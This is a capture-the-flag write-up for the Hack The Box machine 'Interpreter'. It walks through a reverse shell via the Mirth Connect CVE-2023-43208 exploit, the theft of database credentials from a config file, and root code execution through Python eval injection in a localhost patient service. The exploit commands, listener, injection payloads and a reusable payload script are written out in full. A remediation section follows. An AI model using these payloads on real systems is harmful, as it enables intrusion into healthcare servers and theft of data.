+++
title = "Interpreter"
date = 2026-02-21
description = "Mirth Connect 4.4.0 falls to CVE-2023-43208 for a shell as mirth. The database creds in mirth.properties open the channel table, the one channel on the box forwards patient XML to a service on localhost, and that service runs whatever sits inside curly braces as Python, as root."
draft = false

[taxonomies]
tags = ["Public CVE", "Deserialization", "Credentials in config files", "Localhost-only service", "Code injection"]

[extra]
platform = "htb"
os = "linux"
difficulty = "medium"
chain = ["Mirth Connect 4.4.0", "CVE-2023-43208", "DB creds in mirth.properties", "Channel to a localhost service", "f-string eval as root"]
+++

No scenario and no creds on this one, just an IP. The box runs Mirth Connect, a healthcare integration engine: it takes HL7 messages in on one side and pushes them out somewhere else through things it calls channels. That last part ends up mattering more than the CVE.

## Recon

```text,hl_lines=4
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp   open  http     Jetty
443/tcp  open  ssl/http Jetty
6661/tcp open  unknown
```

80 and 443 are both the Mirth Connect Administrator page from NextGen Healthcare. SSH on a Debian 12 host. nmap has no name for 6661, that one gets explained later.

### which Mirth is it

The API hands out the version without a login. It refuses requests that come without an `X-Requested-With` header, so that has to go along:

```bash
curl -sk https://10.129.2.168/api/server/version -H "X-Requested-With: OpenAPI"
```

and it answers `4.4.0`.

That number is the whole foothold. Mirth had a pre-auth RCE in CVE-2023-37679, and 4.4.0 is the release that was supposed to fix it. The fix was a deny list on the XStream deserializer, and CVE-2023-43208 is the bypass for that deny list. So 4.4.0 is patched against the old bug and still open to the new one, the real fix only came with 4.4.1.

## Foothold: CVE-2023-43208

The bug sits in how Mirth unmarshals XML sent to `/api/users`. The request body goes through XStream before any auth check, and a crafted payload with a `ChainedTransformer` gadget chain ends in `Runtime.exec()`.

i used the public PoC by K3ysTr0K3R and Chocapikk. Listener first:

```bash
nc -lvnp 1338
```

Then the exploit:

```bash
python CVE-2023-43208.py -u https://10.129.2.168 -lh <VPN_IP> -lp 1338
```

### pwncat gets in the way

The PoC imports `pwncat-cs` for its own listener, and pwncat has dependency conflicts on Python 3.13 that stop the script at the import. The payload doesn't need it. Comment out `import pwncat.manager`, catch the shell with the `nc` listener from above, and the reverse shell fires anyway.

The shell comes back as `mirth`, uid 103.

## Enumeration over MariaDB

### creds in mirth.properties

Mirth keeps its database connection in its own config at `/usr/local/mirthconnect/conf/mirth.properties`, and the service account can read it:

```ini,hl_lines=2-3
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!

keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
```

A MariaDB on localhost and three passwords.

### sedric and a hash that goes nowhere

```bash
mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod -e "SHOW TABLES;"
mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod -e "SELECT * FROM PERSON;"
mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod -e "SELECT * FROM PERSON_PASSWORD;"
```

`PERSON` has a user `sedric` with ID 2, and `PERSON_PASSWORD` has the hash that belongs to that ID:

```text
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

i looked for a salt next to it:

```bash
mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod -e "DESCRIBE PERSON_PASSWORD;"
```

No salt column. Mirth 4.4.0 hashes with PBKDF2 and keeps everything in that one base64 value, so this is not something to throw at hashcat as it is.

Before spending time on it i tried the cheap thing, `su sedric` with `MirthPass123!` and both keystore passwords. None of them work. i left sedric there and kept reading the database.

### the channel that explains 6661

```bash
mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod -e "SELECT * FROM CHANNEL;"
```

One channel, named `INTERPRETER - HL7 TO XML TO NOTIFY`. Its definition says what it does:

- source: a TCP listener on 6661 speaking MLLP, taking HL7v2 messages
- transformer: turns the HL7 message into an XML patient record
- destination: an HTTP POST to `http://127.0.0.1:54321/addPatient`

So that's the unknown port from the scan. 6661 is the front of this channel, and behind it sits a second service that only listens on localhost and that nmap never saw.

The channel also carries the XML it sends out, base64 encoded. Decoded:

```xml
<patient>
  <timestamp></timestamp>
  <sender_app></sender_app>
  <id></id>
  <firstname></firstname>
  <lastname></lastname>
  <birth_date></birth_date>
  <gender></gender>
</patient>
```

Now i know the URL, the method and the exact body the service expects, and i'm sitting on the host it trusts.

## Privesc: f-string eval on 127.0.0.1:54321

### talking to addPatient

Fill in the template and send it the way the channel would:

```bash
python3 -c "
import urllib.request
xml = '''<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>WEBAPP</sender_app>
  <id>12345</id>
  <firstname>John</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=xml.encode(), method='POST')
req.add_header('Content-Type', 'text/plain')
print(urllib.request.urlopen(req).read().decode())
"
```

```text
Patient John Doe (M), 36 years old, received from WEBAPP at 20250101120000
```

Every field i send comes back in a sentence, and the age is computed from the birth date. Something on the other side is building a string out of my input.

### braces get evaluated

i went through the usual injection payloads in the `firstname` field. The one that gave it away:

```text
firstname={0.__class__} => [EVAL_ERROR] invalid decimal literal (<string>, line 1)
```

`invalid decimal literal` is a message from Python's own parser. `0.` starts a float, `__class__` can't continue one, and Python complains exactly like that. Together with the `[EVAL_ERROR]` tag it means the service takes what's between the braces and hands it to `eval()`, or builds an f-string out of it, which comes to the same thing.

Valid expressions confirm it:

```text
firstname={1}           => Patient 1 Doe (M)...
firstname={True}        => Patient True Doe (M)...
firstname={len('test')} => Patient 4 Doe (M)...
```

`len('test')` coming back as 4 is code execution. Next question is whose:

```text
firstname={__import__('os').popen('id').read()}
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

The service behind the channel runs as root.

### the filter and why open() gets around it

A root shell from here needs a real command line, and that's where the service pushes back. It filters spaces, hyphens, semicolons and pipes in the field values, so `id` goes through and nearly everything with an argument doesn't.

But i'm already inside Python and don't need a shell to read a file. `open()` takes a path, and a path has none of the filtered characters in it:

```python
firstname={open('/home/sedric/user.txt').read()}
firstname={open('/root/root.txt').read()}
```

Wrapped into a script so the payload is the only thing that changes:

```python
import urllib.request

def send(payload):
    xml = '<patient>\n'
    xml += '  <timestamp>20250101120000</timestamp>\n'
    xml += '  <sender_app>WEBAPP</sender_app>\n'
    xml += '  <id>12345</id>\n'
    xml += '  <firstname>{' + payload + '}</firstname>\n'
    xml += '  <lastname>Doe</lastname>\n'
    xml += '  <birth_date>01/01/1990</birth_date>\n'
    xml += '  <gender>M</gender>\n'
    xml += '</patient>'
    req = urllib.request.Request(
        'http://127.0.0.1:54321/addPatient',
        data=xml.encode(), method='POST'
    )
    req.add_header('Content-Type', 'text/plain')
    resp = urllib.request.urlopen(req).read().decode()
    print(resp)

send("open('/home/sedric/user.txt').read()")
send("open('/root/root.txt').read()")
```

Both flags come back in the first name slot. i never became sedric, root reads his flag too. done.

## What could Interpreter improve?

- update Mirth Connect. 4.4.0 only has the deny list patch for CVE-2023-37679, the fix for CVE-2023-43208 is in 4.4.1. The administrator interface and its API also don't belong on a network where anyone can reach them.
- never evaluate text that came in over the wire. The notify service should put the patient fields into a fixed template as plain values. The character filter is no fix, `open()` needed none of the blocked characters.
- the service on 54321 has no reason to run as root. Under its own account the same bug is a second low-privilege shell and not the end of the box.
- binding to 127.0.0.1 only keeps out people who aren't on the host. `mirth` could talk to it the moment the first shell landed, so it needs its own authentication between the channel and the service.

## Appendix

- [Writeup for CVE-2023-43208: NextGen Mirth Connect Pre-Auth RCE (Horizon3.ai)](https://horizon3.ai/attack-research/disclosures/cve-2023-43208/)
- [Hack The Box](https://www.hackthebox.com/)
